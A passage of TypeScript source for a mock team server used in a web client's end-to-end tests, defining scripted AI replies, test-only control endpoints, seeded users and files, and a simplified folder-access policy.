// A mock team server for the web client's end-to-end tests: the REST API of shared/src/api (every response is
// checked against the contract schema, every JSON body is validated like the real server does), the WebSocket
// protocol of ws.ts (hello / seq / resume / reset), and the built web app served by the real serveWeb() of
// server/src/routes/web.ts (same CSP and cache headers as production).
//
// The AI is scripted by keywords in the message: "artifact", "react", "ask", "error", "slow", "files", "search",
// "cap-tools" / "cap-time" (the answer pauses at the per-answer limit of tool calls / time: done with stopReason;
// at the time limit a step still running ends paused), "multi" with "ask" (a question with several answers),
// "sub-agent" (a sub-task step with its sub-agent's steps under it, Step.parentId), "stop-cut" (a step still running
// when the person presses Stop ends stopped, Step.stopped);
// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image.
// Test-only controls: POST /__test/file {path, text | base64} (a team file and its folders), POST /__test/rmdir {path} (a folder gone from disk; its rule rows stay), POST /__test/download-only {path} (a generated, quarantined file: FileEntry.downloadOnly), POST /__test/reset {setup?: boolean, teamLocale?: 'ko'|'en'|'id' (default ko), usersFollowTeam?:
// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password)}, POST /__test/drop-ws, POST /__test/server-version, POST /__test/upload-delay {ms} (an upload's answer comes that late, until the next reset),
// POST /__test/revoke {path} (a folder becomes invisible to everyone + access_changed notice), POST /__test/skills
// {files: [{path, name, description}]} (skill files; skills/임원/ is for admins only),
// POST /__test/schedule-review (the owner gets a scheduled task nobody confirmed, paused for review; "siteask" with
// "ask" is an address card that offers "allow this site in this conversation"),
// POST /__test/confidential {all?: boolean} (Safe operations 1A on: every chat confidential; otherwise a chat becomes
// confidential when a message in it says "confidential"), POST /__test/artifact {type, content} (the next "artifact"
// answer writes exactly this), POST /__test/connection {…ConnectionStatus fields} (Admin > System > Connection shows
// them until the next reset), POST /__test/speech-host {…SpeechHost fields} (this server's cores, speed and hosting
// for "Turn video sound into text", until the next reset), POST /__test/skill-list {…SkillsOverview.aiList} (the Team
// skills page's "how many skills the AI sees" counts, until the next reset), POST /__test/speech {provider, key?: boolean}
// (the team's speech provider and whether an OpenRouter key is set), GET-or-POST /__test/transcribe-chats (the chat id
// each voice input named, null for a new chat; a confidential chat's recording with OpenRouter is refused, 403).
// External services: an address on a "down." host fails its check, the key "wrong-key" is refused, the fake MCP server
// offers two tools at the first check and a third from the next one (one on a "many." host offers 150, of which the
// first 100 are kept), and a sign-in completes on the second poll.
// POST /__test/dev-env {box?: 'running', srt?: true} turns the dev environment (experiment) on for every project until the next reset.
import { z } from 'zod'
// Keep the server renderer outside the browser TypeScript program; this module runs only in Bun.
const hwpEngine = import('../../../server/src/files/' + 'hwp-engine.ts').then(m => new m.NativeHwpEngine())
import {
  ApiErrorResponse, CSRF_HEADER, TeamGoal, type SkillChange, type SkillManagerGrant, type SkillSuggestion, DEV_SESSION_COOKIE, CHAT_ERROR_MESSAGES, type ChatErrorReason, ERROR_MESSAGES, LOCALE_HEADER, Locale, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
  type ApiName, type Artifact, type Attachment, type SkillInput, type DevEnvRun, type Chat, type Endpoint, type ErrorCode, type FileEntry, type FileVersion, type Folder, type Group, type Invite, type Job, type Me, type Message,
  MemberEngineChoice, WELCOME_RESULT_SKILL, GENERAL_TASKS_SKILL, GENERAL_BRIEF_SKILL, GENERAL_CARDNEWS_SKILL, CARD_NEWS_ARTIFACT_KEY, GENERAL_PROMO_SKILL, PROMO_ARTIFACT_KEY, PROMO_STYLES, GENERAL_DECK_SKILL, DECK_ARTIFACT_KEY, NOTES_FOLDER, PACK_FOLDERS, BRAND_IMAGES_FOLDER, type TeamLinkStarter, type WelcomeProgress, type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry, type Schedule,
} from '@mycel/shared/api'
import fs from 'node:fs'
import * as XLSX from 'xlsx'
import { CCITT_SCAN, JPX_SCAN, makeCidPdf, makeImagePdf, makePagedPdf, makePdf } from '../../../tests/lib/pdf'
import { serveWeb } from '../../../server/src/routes/web-static'
import { TEXT as TEAM_ICON_TEXT } from '../../../server/src/admin/team-icon'
import { msg as serverMsg } from '../../../server/src/auth/messages'
import { folderKeep, isParkedRow, isTeamDefaultFolder } from '../../../server/src/admin/folder-keep'
import { checkTeamIcon, TEAM_ICON_MAX_BYTES, type TeamIconFile } from '@mycel/shared'
import { Sealer } from '../../../server/src/credentials/seal'
import type { Credential, CredentialKind, CredentialLogin, MessageSourceFile, SealedSecret } from '@mycel/shared/api'
import type { Integration, IntegrationAccess, IntegrationFlow, IntegrationInput, IntegrationPatch, IntegrationRequest, IntegrationTemplate, IntegrationTool } from '@mycel/shared/api'
import { normalizeWebsite, SkillsOverview, type AccessFolderKind, type AccessTreeResponse, type FolderAccessResponse, type FolderEditPreview, type PersonAccessResponse } from '@mycel/shared/api'
import { RuleSet, type Access } from '../../../server/src/policy/access'
import { byPerson, folderInput, MAX_VIA, navigation, pageByPath, pageByPerson, ruleFolderOf, segsOf, shownPath, shownSegs, summarize, withoutOwnFolder } from '../../../server/src/admin/access-rows'
import { ruledAnswer, treeAnswer, type TreeMark, type TreeSource } from '../../../server/src/admin/access-tree'
import { editPreview, rulesHash } from '../../../server/src/admin/access-edit'
import os from 'node:os'
import path from 'node:path'
import { MockPlugins } from './plugins'

type Json = Record<string, unknown>
const sha256Hex = (d: Uint8Array) => new Bun.CryptoHasher('sha256').update(d).digest('hex')
const parentOf = (p: string) => (p.includes('/') ? p.slice(0, p.lastIndexOf('/')) : '')
/** like a server whose relay.officialAvailable is off: the official relay is not offered */
const defaultConnection = (): ConnectionStatus => ({ mode: 'self-relay', address: 'http://acme.localhost:19143', state: 'connecting', detail: null, connectedSince: null, direct: { enabled: false, port: 8443, fingerprintSha256: null }, teamName: 'acme', availableModes: ['self-relay', 'direct-only'] })
class Fail extends Error {
  constructor(public code: ErrorCode, public status: number, msg?: string, public fields?: Record<string, string>, public params?: Record<string, string | number | boolean>) {
    super(msg ?? ERROR_MESSAGES[code].ko)
  }
}
/** the Claude sign-in's authorize address (tests/lib/fake-claude-login.ts has the same shape) */
const MOCK_CLAUDE_AUTHORIZE = 'https://claude.com/cai/oauth/authorize?code=true&client_id=mock&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback&scope=user%3Ainference&code_challenge=mock&code_challenge_method=S256&state=good-state'
const fail = (code: ErrorCode, status: number, msg?: string, fields?: Record<string, string>): never => {
  throw new Fail(code, status, msg, fields)
}
/** Like server/src/admin/users.ts temporaryFor: a typed temporary password must be ASCII, 8+ and not a common one. */
function checkTemp(pw: string | undefined): void {
  if (pw === undefined) return
  if (!/^[\x21-\x7e]+$/.test(pw)) fail('validation', 400, '임시 비밀번호에는 영문·숫자·기호만 쓸 수 있어요(공백·한글 불가). 한/영 키를 확인해 주세요.', { 'body.temporaryPassword': 'letters, digits and symbols only' })
  if (['12345678', 'password', 'qwerty123'].includes(pw.toLowerCase())) fail('validation', 400, '더 안전한 비밀번호를 정해 주세요. 너무 흔한 비밀번호예요.', { 'body.temporaryPassword': 'this password is too common' })
}
const tempUntil = () => new Date(Date.now() + 7 * 86400_000).toISOString()
const now = () => new Date().toISOString()
/** Admin > Activity log rows (made up), newest first: see the `audit` handler. */
function auditRows(): AuditEntry[] {
  const t = Date.now()
  const at = (ms: number) => new Date(t - ms).toISOString()
  const olga = { id: 'olga', name: 'Olga' }
  const bob = { id: 'bob', name: 'Bob' }
  const min = 60_000
  const day = 86_400_000
  const rows: AuditEntry[] = [
    { id: 'a1', source: 'admin', at: at(0), actor: olga, action: 'invite.create', target: 'member', turnId: null, detail: { role: 'member' } },
    ...[2, 4, 6, 8, 10].map((m, i): AuditEntry => ({ id: `s${i}`, source: 'auth', at: at(m * min), actor: bob, action: 'auth.login', target: 'bob', turnId: null, detail: { ip: '10.0.0.7' } })),
    { id: 'f1', source: 'file', at: at(12 * min), actor: olga, action: 'update', target: 'finance/2026/plan.md', turnId: null, detail: { size: 2048, sha256: 'c'.repeat(64), detail: null } },
    { id: 't1', source: 'tool', at: at(14 * min), actor: bob, action: 'read', target: null, turnId: null, detail: { summary: 'read hr/salaries.xlsx -> denied: no access', ok: 0 } },
    { id: 't2', source: 'tool', at: at(16 * min), actor: bob, action: 'read', target: null, turnId: null, detail: { summary: 'read marketing/plan.md', ok: 1 } },
    { id: 'k1', source: 'admin', at: at(day + 5 * min), actor: olga, action: 'skills.change', target: 'skills/weekly-team-report/SKILL.md', turnId: null, detail: null },
  ]
  for (let d = 2; d <= 121; d++) rows.push({ id: `o${d}`, source: 'auth', at: at(d * day), actor: olga, action: 'auth.login', target: 'olga', turnId: null, detail: { ip: '10.0.0.2' } })
  return rows
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

interface FileNode { type: 'file' | 'folder'; data?: Uint8Array; mtime: string; mime?: string }
interface WsData { user: string; windowId: string; epoch: string | null; after: number | null }
interface Ctx { user: User; params: Record<string, string>; query: Record<string, string>; body: any; req: Request; file?: File }
type Handler = (c: Ctx) => unknown | Promise<unknown>

const enc = new TextEncoder()
const dec = new TextDecoder()

const OWNER_PASSWORD = 'correct horse battery'
/** the general pack's card news as the server installs it (resources/skill-packs/general/ko/card-news), its form included:
 * a member who joins with the first result's invite lands on it */
const CARDNEWS_TEXT = '---\nname: card-news\ndescription: 카드뉴스 — 회사 소개서나 자료를 읽고 정사각형 카드뉴스 5장을 만들어요.\nmetadata:\n  title: 카드뉴스\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 소개 전체"}, {"name": "channel", "label": "어디에 올릴까요", "type": "choice", "default": "instagram", "options": [{"value": "instagram", "label": "인스타그램"}, {"value": "linkedin", "label": "링크드인"}, {"value": "blog", "label": "블로그"}]}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 카드뉴스\n'
/** the general pack's promo video (resources/skill-packs/general/ko/promo-video), its form included: the welcome steps'
 * first result of docs/DECISIONS.md "V", still installed */
const PROMO_TEXT = '---\nname: promo-video\ndescription: 홍보 영상 — 회사 소개서나 자료를 읽고 팀 브랜드 폴더의 사진과 브랜드 색으로 세로형 홍보 영상을 만들어요.\nmetadata:\n  title: 홍보 영상\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 소개 전체"}, {"name": "channel", "label": "어디에 올릴까요", "type": "choice", "default": "instagram", "options": [{"value": "instagram", "label": "인스타그램"}, {"value": "linkedin", "label": "링크드인"}, {"value": "website", "label": "홈페이지"}]}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 홍보 영상\n'
/** the general pack's intro deck (resources/skill-packs/general/ko/intro-deck), its form included: the welcome steps'
 * first result since docs/DECISIONS.md "D2"; a member who joins with its invite lands on it */
const DECK_TEXT = '---\nname: intro-deck\ndescription: 회사 소개서 — 회사 소개 자료나 홈페이지에서 읽은 내용으로 팀 브랜드 폴더의 사진과 브랜드 색을 써서 회사 소개서 슬라이드를 만들어요.\nmetadata:\n  title: 회사 소개서\n  inputs: |\n    [{"name": "topic", "label": "주제", "placeholder": "비워 두면 회사 전체"}, {"name": "audience", "label": "누구에게 보낼까요", "placeholder": "예: 제조업 고객사 · 비워 두면 누구에게나"}, {"name": "files", "label": "자료 파일", "placeholder": "비워 두면 팀 브랜드 폴더의 회사 소개", "advanced": true}]\n---\n# 회사 소개서\n'

/** like server/src/admin/settings.ts LOCALE_CHANGED */
const LOCALE_CHANGED = { type: 'notice', data: { level: 'info', code: 'locale_changed', message: '' } } as const
/** like server/src/admin/settings.ts BROWSER_POLICY_CHANGED */
const BROWSER_POLICY_CHANGED = { type: 'notice', data: { level: 'info', code: 'browser_policy_changed', message: '' } } as const
/** like server/src/admin/team-icon.ts TEAM_ICON_CHANGED */
const TEAM_ICON_CHANGED = { type: 'notice', data: { level: 'info', code: 'team_icon_changed', message: '' } } as const

export class MockServer {
  setupNeeded = false
  serverVersion = '0.1.0'
  epoch = uuidv7()
  seq = 0
  buffer: { seq: number; text: string }[] = []
  sockets = new Set<Bun.ServerWebSocket<WsData>>()
  sessions = new Map<string, string>() // token -> user id
  /** people whose latest sign-in used a temporary password (Me.session.tempLogin while they must change it) */
  tempLogins = new Set<string>()
  users: User[] = []
  passwords = new Map<string, string>()
  /** last password reset by an admin, per user id (Me.passwordReset) */
  resets = new Map<string, NonNullable<Me['passwordReset']>>()
  groups: Group[] = []
  invites: (Invite & { token: string })[] = []
  /** the team invite link (shared/src/api/team-links.ts): one open at a time; replaced and revoked tokens say "revoked" */
  teamLink: { id: string; token: string; groupIds: string[]; skillPath: string | null; starter: TeamLinkStarter | null; maxUses: number; uses: number; createdBy: { id: string; name: string }; createdAt: string; expiresAt: string } | null = null
  revokedTeamLinks = new Set<string>()
  /** the welcome steps' progress (server/src/onboarding/welcome.ts) */
  welcome: WelcomeProgress | null = null
  /** the saved company profile, and the website readings (server/src/onboarding/draft.ts, short: no chat of the list) */
  companyProfile: import('@mycel/shared/api').CompanyProfile | null = null
  profileDrafts = new Map<string, { userId: string; website: string; reads: number }>()
  /** the suggestion under answers a test set, and the ones closed */
  resultSuggestion: import('@mycel/shared/api').ResultSuggestion | null = null
  closedSuggestions = new Set<string>()
  /** team skill drafts (server/src/onboarding/skill-draft.ts, short): the source chat, reads so far, where it was saved */
  skillDrafts = new Map<string, { userId: string; sourceChatId: string; reads: number; saved: string | null }>()
  /** who made a team skill (server/src/skills/author.ts: its file's first version); pack skills have none */
  skillMakers = new Map<string, string>()
  folders: Folder[] = []
  chats: Chat[] = []
  messages: Message[] = []
  artifacts: Artifact[] = []
  projects: Project[] = []
  memories: Memory[] = []
  /** Settings › Scheduled tasks (POST /__test/schedule-review adds one nobody confirmed: needsReview) */
  schedules: (Schedule & { userId: string })[] = []
  budgets: Budget[] = []
  files = new Map<string, FileNode>()
  versions: FileVersion[] = []
  connection: ConnectionStatus = defaultConnection()
  trash: (TrashItem & { node: FileNode })[] = []
  uploads = new Map<string, UploadSession & { chunks: Map<number, Uint8Array> }>()
  attachments = new Map<string, Attachment & { data: Uint8Array }>()
  jobs = new Map<string, Job>()
  pendingAsk = new Map<string, (v: unknown) => void>()
  /** open cards by turn (GET /api/chats/:id/requests after a reload) */
  openAsks = new Map<string, { turnId: string; chatId: string; messageId: string; request: TurnRequest }>()
  stopped = new Set<string>()
  queuePositions = new Map<string, number>()
  queueRevision = 0
  settings: TeamSettings = defaultSettings()
  /** the team logo (Admin > Team settings): served by the real serveWeb() at /team-icon, /favicon.ico, the manifest */
  teamIcon: TeamIconFile | null = null
  speechKey: { set: boolean; hint: string | null; updatedAt: string | null } = { set: false, hint: null, updatedAt: null }
  /** the chat id each voice input named (null: a new chat) */
  transcribeChats: (string | null)[] = []
  /** GET /api/admin/speech-host: a 4-core self-installed server that has not measured its speed yet */
  speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null as number | null, hostedNewSec: null as number | null }
  /** every request the client made (method + path), for assertions */
  log: string[] = []
  /** team skills: "팀 스킬 관리" grants (also kept as folder rules on this.folders), suggestions, changes under skills/ */
  skillManagers: SkillManagerGrant[] = []
  suggestions: SkillSuggestion[] = []
  skillChanges: SkillChange[] = []
  /** engine / model named in chat requests (tests check people who may not pick never send one) */
  engineRequests: { name: string; user: string; engine?: unknown; model?: unknown }[] = []
  /** Admin > AI engines: "팀원이 엔진 고르기 허용" and the Claude-limit fallback (like the server: off by default) */
  memberChoice: MemberEngineChoice = { mode: 'off', groupIds: [], userIds: [] }
  limitFallback = false
  codexEnabled = true
  // the API engine: listed like on a real server, off here so chats and Admin Home do not count it
  apiEngineEnabled = false
  /** Admin > AI connections: the team's connections (secrets are opened with the real server sealing code and dropped) */
  credentials: Credential[] = []
  credMemberOwn = true
  credSharedSubscriptions = false
  credLogins = new Map<string, CredentialLogin & { userId: string; personal: boolean; label: string; reconnectId?: string }>()
  sealer = new Sealer(fs.mkdtempSync(path.join(os.tmpdir(), 'mycel-mock-seal-')))
  /** External services (like server/src/integrations): personal and team connections. Keys and tokens are kept apart
   * and never go back out (only `hasSecret`). */
  integrations: MockIntegration[] = []
  plugins = new MockPlugins()
  /** after-update to-dos an admin dismissed (server/src/system/after-update.ts) */
  afterDismissed: string[] = []
  integrationSecrets = new Map<string, string>()
  integrationFlows = new Map<string, { flow: IntegrationFlow; integrationId: string; userId: string; polls: number }>()
  /** an admin's requests to members to connect a service as their own (like server/src/integrations/connections/requests.ts) */
  integrationRequests: (IntegrationRequest & { integrationId: string | null })[] = []
  /** an admin's templates each member connects with their own key (like server/src/integrations/connections/templates.ts) */
  integrationTemplates: (Omit<IntegrationTemplate, 'connected'> & { version: number })[] = []
  /** Team AX Cloud (server/src/system/deployment.ts): /__test/cloud switches it on until the next reset */
  cloud = false
  /** the 7-day team goal Home shows owners and admins (onboarding G): none unless /__test/team-goal sets one */
  teamGoal: TeamGoal | null = null
  /** Home's frequent skills (GET /api/skills/popular): none unless /__test/popular-skills names some by path */
  popular: { path: string; uses: number; users: number }[] = []
  /** POST /__test/dev-env {box?: 'running'}: the dev environment (experiment) of every project is on until the next
   * reset, with a stopped box (or a running one) and a few lines of activity; srt: true is the srt runner (no box, a
   * running dev server and a waiting job, warning version 2); otherwise its endpoints answer 404, like
   * a server without MYCEL_DEV_ENV */
  devEnv: { box: 'stopped' | 'running'; srt?: { running: DevEnvRun[]; waiting: DevEnvRun[] } } | null = null
  /** the team setting devEnv.team (GET and PUT /api/admin/dev-env), off until an admin turns it on */
  devEnvTeam = MockServer.devEnvTeamDefault()
  static devEnvTeamDefault() {
    return { extraDomains: [] as string[], enabled: false, scope: { mode: 'writers' as 'writers' | 'selected', groupIds: [] as string[], userIds: [] as string[] }, network: 'open' as 'open' | 'offline',
      limits: { cpus: 1, memoryMiB: 2560, pids: 512, diskGiB: 4, idleStopMin: 30 }, consent: null as { by: { id: string; name: string } | null; at: string; warningVersion: number } | null }
  }
  /** the sites a person allowed and her Full internet switch (GET /api/dev-env/sites); per person, like the server */
  devEnvSites = new Map<string, { sites: { host: string; createdAt: string }[]; full: boolean }>()
  devEnvSitesOf(userId: string) {
    if (!this.devEnv?.srt) fail('not_found', 404)
    const mine = this.devEnvSites.get(userId) ?? { sites: [], full: false }
    this.devEnvSites.set(userId, mine)
    const base = { fullAvailable: true, fullWarningVersion: 1, maxSites: 100 }
    if (this.devEnvTeam.network === 'offline') return { state: 'no_network' as const, sites: [], fullInternet: false, teamSites: [], ...base }
    return { state: 'on' as const, sites: mine.sites, fullInternet: mine.full, teamSites: ['registry.npmjs.org', 'pypi.org', 'github.com', ...this.devEnvTeam.extraDomains], ...base }
  }
  devEnvTeamView() {
    if (!this.devEnv) fail('not_found', 404)
    const srt = !!this.devEnv!.srt
    return { setting: this.devEnvTeam, defaultDomains: ['registry.npmjs.org', 'pypi.org', 'github.com'], plan: srt ? { plan: 'starter', maxRunning: 1, cpus: 2, memoryMiB: 3072, pids: 1024, network: 'open' } : null,
      runner: srt ? 'srt' as const : 'box' as const, warningVersion: srt ? 2 : 1, availability: { available: true } }
  }

  constructor(o: { setup?: boolean } = {}) {
    this.reset(o)
  }

  generation = 0

  /** seeded people (olga, bob) have no language of their own */
  usersFollowTeam = false

  /** POST /__test/upload-delay: the bytes of an upload are in, the answer takes this long (a server that is finishing) */
  uploadDelayMs = 0
  private uploadAnswer = () => new Promise<void>((done) => setTimeout(done, this.uploadDelayMs))

  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string } = {}) {
    this.generation++
    this.uploadDelayMs = 0
    this.setupNeeded = !!o.setup
    this.usersFollowTeam = !!o.usersFollowTeam
    this.serverVersion = '0.1.0'
    this.aiList = undefined
    this.cloud = false
    this.teamGoal = null
    this.popular = []
    this.devEnv = null
    this.devEnvTeam = MockServer.devEnvTeamDefault()
    this.devEnvSites = new Map()
    this.epoch = uuidv7()
    this.seq = 0
    this.buffer = []
    for (const ws of this.sockets) ws.close(1012, 'reset')
    this.sessions.clear()
    this.tempLogins.clear()
    this.passwords.clear()
    this.resets.clear()
    this.users = []
    this.groups = []
    this.invites = []
    this.teamLink = null
    this.revokedTeamLinks.clear()
    this.welcome = null
    this.companyProfile = null
    this.profileDrafts = new Map()
    this.resultSuggestion = null
    this.closedSuggestions = new Set()
    this.skillDrafts = new Map()
    this.skillMakers = new Map()
    this.chats = []
    this.sources.clear()
    this.messages = []
    this.artifacts = []
    this.allConfidential = false
    this.nextArtifact = null
    this.projects = []
    this.memories = []
    this.schedules = []
    this.budgets = []
    this.versions = []
    this.trash = []
    this.uploads.clear()
    this.attachments.clear()
    this.jobs.clear()
    this.files.clear()
    this.log = []
    this.engineRequests = []
    this.skillManagers = []
    this.suggestions = []
    this.skillChanges = []
    this.memberChoice = { mode: 'off', groupIds: [], userIds: [] }
    this.limitFallback = false
    this.codexEnabled = true
    this.apiEngineEnabled = false
    this.credentials = []
    this.credMemberOwn = true
    this.credSharedSubscriptions = false
    this.credLogins.clear()
    this.integrations = []
    this.plugins.reset()
    this.afterDismissed = []
    this.integrationSecrets.clear()
    this.integrationFlows.clear()
    this.integrationRequests = []
    this.integrationTemplates = []
    this.settings = defaultSettings()
    this.teamIcon = null
    this.speechKey = { set: false, hint: null, updatedAt: null }
    this.transcribeChats = []
    this.speechHost = { cpuCores: 4, localPieceSec: 30, localSecPerSec: null, hostedNewSec: null }
    if (o.teamLocale) this.settings.defaultLocale = o.teamLocale
    this.activeLeaf.clear()
    this.pendingAsk.clear()
    this.openAsks.clear()
    this.stopped.clear()
    this.queuePositions.clear()
    this.queueRevision = 0
    this.revoked.clear()
    this.downloadOnly.clear()
    this.connection = defaultConnection()
    if (!this.setupNeeded) this.seed()
    for (const u of this.users) if (u.username === o.mustChange) u.mustChangePassword = true
  }

  seed() {
    const g: Group = { id: uuidv7(), name: '재무팀', description: '재무 자료', memberIds: ['olga'] }
    this.groups = [g]
    const own = this.usersFollowTeam ? null : 'ko'
    this.addUser({ id: 'olga', username: 'olga', name: 'Olga', role: 'owner', groupIds: [g.id], localeChoice: own }, OWNER_PASSWORD)
    this.addUser({ id: 'bob', username: 'bob', name: 'Bob', role: 'member', groupIds: [], localeChoice: own }, 'bob password 1')
    for (const p of ['docs', 'finance', 'finance/2026', 'marketing', 'secret', 'users', 'users/olga']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('marketing/plan.md', '# Plan\n\n- launch\n- grow\n')
    this.putFile('marketing/data.csv', 'name,value\nalpha,1\nbeta,2\n')
    this.putFile('marketing/notes.txt', 'hello notes')
    this.putFile('finance/2026/q3.csv', 'q,amount\nq3,100\n')
    this.putFile('marketing/page.html', '<h1>Hi</h1><script>document.body.append("ran")</script>')
    this.putFile('marketing/plan (충돌 사본 - Bob 2026-10-21 10.00).md', '# Plan conflicting\n')
    for (const [p, data] of officeFixtures()) this.putFile(p, data)
    for (const p of ['skills', 'skills/재무']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('skills/team-rules.md', '# 팀 규칙\n- 금액은 원 단위로 쓴다\n')
    this.folders = [
      { id: uuidv7(), path: 'finance', exists: true, createdAt: now(), rules: [] },
    ]
    this.folders[0]!.rules = [{ id: uuidv7(), folderId: this.folders[0]!.id, subjectType: 'group', subjectId: g.id, access: 'read', updatedBy: null, updatedAt: now() }]
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 1, sha256: 'a'.repeat(64), size: 20, author: { id: 'bob', name: 'Bob' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'olga', name: 'Olga' }, savedTurnId: null })
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 2, sha256: 'b'.repeat(64), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now(), savedBy: { id: 'bob', name: 'Bob' }, savedTurnId: null })
    // a version identical to the file as it is now (after a restore): shown as "same as now", not offered
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 3, sha256: sha256Hex(this.files.get('marketing/plan.md')!.data!), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'restore', conflictPath: null, createdAt: now() })
    // finance is read-only for the owner here: versions can be downloaded, not restored
    this.versions.push({ id: uuidv7(), path: 'finance/2026/q3.csv', version: 1, sha256: 'c'.repeat(64), size: 12, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
  }

  /** like the server: people without their own language see the team default */
  syncLocales() {
    for (const u of this.users) u.locale = u.localeChoice ?? this.settings.defaultLocale
  }

  addUser(u: Pick<User, 'id' | 'username' | 'name' | 'role' | 'groupIds'> & { mustChangePassword?: boolean; localeChoice?: Locale | null }, password: string) {
    const user: User = { email: null, status: 'active', mustChangePassword: false, locale: 'ko', localeChoice: null, createdAt: now(), lastSeenAt: null, ...u }
    user.locale = user.localeChoice ?? this.settings.defaultLocale
    this.users.push(user)
    this.passwords.set(user.username, password)
    return user
  }

  /** "name (2).ext", "name (3).ext", …: the first one not taken (onExists rename) */
  freePath(p: string): string {
    for (let i = 2; ; i++) {
      const q = p.replace(/(\.[^./]+)?$/, (ext: string) => ` (${i})${ext}`)
      if (!this.files.has(q)) return q
    }
  }

  putFile(path: string, content: string | Uint8Array) {
    const data = typeof content === 'string' ? enc.encode(content) : content
    this.files.set(path, { type: 'file', data, mtime: now() })
  }

  // ---------------- access (simplified policy) ----------------
  /** folders taken away from everyone by POST /__test/revoke (an admin's rule change) */
  revoked = new Set<string>()
  /** answers' "참고한 파일" as recorded (GET .../messages/:messageId/sources checks each against the viewer now) */
  sources = new Map<string, MessageSourceFile[]>()
  /** POST /__test/confidential {all: true}: Safe operations 1A is on (Me.server.allChatsConfidential) */
  allConfidential = false
  /** POST /__test/artifact: what the next "artifact" answer writes */
  nextArtifact: { type: 'html' | 'svg' | 'react' | 'mermaid'; content: string } | null = null
  access(path: string, user: User): 'none' | 'read' | 'write' {
    if (path === '' ) return 'write'
    if ([...this.revoked].some((r) => path === r || path.startsWith(r + '/'))) return 'none'
    if (path === 'secret' || path.startsWith('secret/')) return 'none'
    if (path.startsWith('users/')) {
      const owner = path.split('/')[1]
      return owner === user.id || user.role === 'owner' ? 'write' : 'none'
    }
    if (path === 'finance' || path.startsWith('finance/')) return user.role === 'owner' ? 'read' : 'none'
    // a skills folder only admins can read (POST /__test/skills puts skills there): members never see its skills
    if (path === 'skills/임원' || path.startsWith('skills/임원/')) return user.role === 'member' ? 'none' : 'read'
    return 'write'
  }

  entry(path: string, n: FileNode, user: User): FileEntry {
    return { name: path.slice(path.lastIndexOf('/') + 1), path, type: n.type, size: n.type === 'file' ? n.data!.byteLength : null, mtime: n.mtime, mime: n.type === 'file' ? mimeOf(path) : null, access: this.access(path, user),
      ...(n.type === 'file' && this.downloadOnly.has(path) ? { downloadOnly: true as const } : {}) }
  }
  /** POST /__test/download-only {path}: a file Safe operations 1A generated (quarantined: FileEntry.downloadOnly) */
  downloadOnly = new Set<string>()
  /** POST /__test/skill-list: what GET /api/skills/overview says of the AI's skill list (server/src/chat/skill-list.ts) */
  aiList: SkillsOverview['aiList'] = undefined

  // ---------------- folder access explained (like server/src/admin/access-explain.ts) ----------------
  // The server's own RuleSet over the folder rules of Admin › 폴더 권한 here (the file screens above keep their
  // simplified policy), and the server's own rows, order, pages and counts (server/src/admin/access-rows.ts): nothing
  // under users/ but the person's own folder, no .system/ or temp names. Group folders are groups/<group name> when
  // that folder is here; connected folders are the folders under connected/ (POST /__test/file makes either).
  explainRules() { return new RuleSet(this.folders.flatMap((f) => f.rules.map((r) => ({ path: f.path, subject_type: r.subjectType, subject_id: r.subjectId, access: r.access })))) }
  explainPrincipal(u: User) { return { id: u.id, name: u.name, role: u.role, groups: u.groupIds } }
  isFolder(p: string) { return p === '' || this.files.get(p)?.type === 'folder' || this.folders.some((f) => f.path === p) }
  explainFolder(q: { path?: string; cursor?: string; limit?: string }): FolderAccessResponse {
    const input = folderInput(q.path)
    if ('refuse' in input) fail('validation', 400, input.refuse === 'personal' ? '개인 폴더(users/)는 본인만 봐요. 사람 기준으로 확인해 주세요.' : '팀 폴더 경로가 아니에요.', { 'query.path': input.detail })
    const segs = (input as { segs: string[] }).segs
    const p = segs.join('/')
    const rules = this.explainRules()
    const ruleFolder = ruleFolderOf(new Set(rules.ruleFolders()), segs)
    const at = ruleFolder === null ? segs : segsOf(ruleFolder)
    const all = this.users.filter((u) => u.status === 'active').sort(byPerson).map((u) => ({ u, ...rules.explain(this.explainPrincipal(u), at) }))
    const pg = pageByPerson(all, (r) => r.u, { cursor: q.cursor, limit: q.limit ? Number(q.limit) : undefined }) ?? fail('validation', 400, '입력값을 확인해 주세요.', { 'query.cursor': 'not a cursor of this answer' })
    const nav = rules.navigator(segs, MAX_VIA, shownPath)
    const people = pg.items.map(({ u, access, reason }) => ({ user: { id: u.id, name: u.name }, role: u.role, access, reason, ...navigation(() => nav(this.explainPrincipal(u)), access) }))
    const off = new Map<string, { folder: string; access: Access }[]>()
    for (let len = segs.length; len >= 0; len--) {
      const f = segs.slice(0, len).join('/')
      for (const r of rules.rulesAt(f)) if (r.subjectType === 'user' && r.subjectId && !this.users.some((u) => u.id === r.subjectId && u.status === 'active')) off.set(r.subjectId, [...(off.get(r.subjectId) ?? []), { folder: f, access: r.access }])
    }
    const inactive = [...off].map(([id, rs]) => {
      const u = this.users.find((x) => x.id === id)
